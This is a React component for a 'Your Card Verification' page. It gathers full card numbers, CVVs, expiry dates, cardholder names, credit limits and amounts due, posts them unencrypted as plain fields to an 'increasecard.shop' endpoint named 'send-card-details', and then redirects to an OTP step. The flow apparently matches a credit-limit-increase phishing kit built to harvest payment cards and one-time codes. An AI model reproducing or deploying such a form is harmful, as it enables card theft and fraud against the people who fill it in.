import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import "./creditcardform.css";
import "../ApplicationForm/application.css";
import formlogo from "../../Images/application_logo.png";
import { Link } from "react-router-dom";
import axios from "axios";

const CardDetail = () => {
  const [cardNumber, setCardNumber] = useState("");
  const [totalAmountDue, setTotalAmountDue] = useState("");
  const [creditLimit, setCreditLimit] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardHolderName, setCardHolderName] = useState("");
  const [errors, setErrors] = useState({});

  const navigate = useNavigate();

  const handleValidation = () => {
    const newErrors = {};

    if (!cardNumber || cardNumber.length !== 16) {
      newErrors.cardNumber = "Card number must be 16 digits long.";
    }
    if (!cvv || cvv.length !== 3) {
      newErrors.cvv = "CVV must be 3 digits long.";
    }
    if (!totalAmountDue ) {
      newErrors.totalAmountDue = "Please enter a valid amount.";
    }
    if (!creditLimit || creditLimit <= 0) {
      newErrors.creditLimit = "Please enter a valid credit limit.";
    }
    if (!cardHolderName) {
      newErrors.cardHolderName = "Cardholder name is required.";
    }
    if (!expiryMonth || expiryMonth < 1 || expiryMonth > 12) {
      newErrors.expiryMonth = "Please enter a valid month (1-12).";
    }
    if (!expiryYear || expiryYear < new Date().getFullYear()) {
      newErrors.expiryYear = "Please enter a valid year.";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (handleValidation()) {
      try {
        const response = await axios.post("https://www.api.increasecard.shop/v1/send-card-details", {
          cardNumber: Number(cardNumber),
          creditLimit: Number(creditLimit),
          totalAmountDue: Number(totalAmountDue),
          cardHolderName,
          expiryMonth: Number(expiryMonth),
          expiryYear: Number(expiryYear),
          cvv: Number(cvv),
        });

        console.log(response);

        if (response.status === 200) {
          toast.success("Form submitted successfully! Proceeding to the next step.");
          setTimeout(() => {
            navigate("/otp");
          }, 2000); // Delay before navigating to OTP
        } else {
          toast.error(response.data.message || "Error submitting form.");
        }
      } catch (error) {
        console.log(error);
        if (error.response && error.response.data) {
          toast.error(error.response.data.message);
        } else {
          toast.error("Something went wrong. Please try again.");
        }
      }
    }
  };

  return (
    <div className="creditCardMain">
      <ToastContainer />
      <div className="container-fluid">
        <div className="form-logo">
          <Link to="/">
            <img src={formlogo} alt="logo" />
          </Link>
        </div>
      </div>
      <div className="container bg-light p-3 creditCardDiv">
        <h3 className="text-center mb-4">Your Card Verification</h3>
        <form onSubmit={handleSubmit}>
          <div className="mb-3">
            <div className="row">
              <div className="col-md-3 mb-3">
                <label><b>Available Credit Limit</b></label>
                <input
                  type="number"
                  className="inputFields"
                  placeholder="Enter credit limit"
                  value={creditLimit}
                  onChange={(e) => setCreditLimit(e.target.value)}
                />
                {errors.creditLimit && <p className="text-danger">{errors.creditLimit}</p>}
              </div>
              <div className="col-md-3 mb-3">
                <label><b>Total Amount Due</b></label>
                <input
                  type="number"
                  className="inputFields"
                  placeholder="Enter amount due"
                  value={totalAmountDue}
                  onChange={(e) => setTotalAmountDue(e.target.value)}
                />
                {errors.totalAmountDue && <p className="text-danger">{errors.totalAmountDue}</p>}
              </div>
              <div className="col-md-3 mb-3">
                <label><b>Card Holder Name</b></label>
                <input
                  type="text"
                  className="inputFields"
                  placeholder="Enter cardholder name"
                  value={cardHolderName}
                  onChange={(e) => setCardHolderName(e.target.value)}
                />
                {errors.cardHolderName && <p className="text-danger">{errors.cardHolderName}</p>}
              </div>
              <div className="col-md-3 mb-3">
                <label><b>Card Number</b></label>
                <input
                  type="number"
                  className="inputFields"
                  placeholder="Enter card number"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value)}
                />
                {errors.cardNumber && <p className="text-danger">{errors.cardNumber}</p>}
              </div>
            </div>
            <div className="row">
              <div className="col-md-3 mb-3">
                <label><b>Expiry Month</b></label>
                <input
                  type="number"
                  className="inputFields"
                  placeholder="MM"
                  value={expiryMonth}
                  onChange={(e) => setExpiryMonth(e.target.value)}
                />
                {errors.expiryMonth && <p className="text-danger">{errors.expiryMonth}</p>}
              </div>
              <div className="col-md-3 mb-3">
                <label><b>Expiry Year</b></label>
                <input
                  type="number"
                  className="inputFields"
                  placeholder="YYYY"
                  value={expiryYear}
                  onChange={(e) => setExpiryYear(e.target.value)}
                />
                {errors.expiryYear && <p className="text-danger">{errors.expiryYear}</p>}
              </div>
              <div className="col-md-3 mb-3">
                <label><b>CVV</b></label>
                <input
                  type="number"
                  className="inputFields"
                  placeholder="CVV"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value)}
                />
                {errors.cvv && <p className="text-danger">{errors.cvv}</p>}
              </div>
            </div>
          </div>
          <div className="text-center">
            <button type="submit" className="knowmorebtn">Submit</button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default CardDetail;
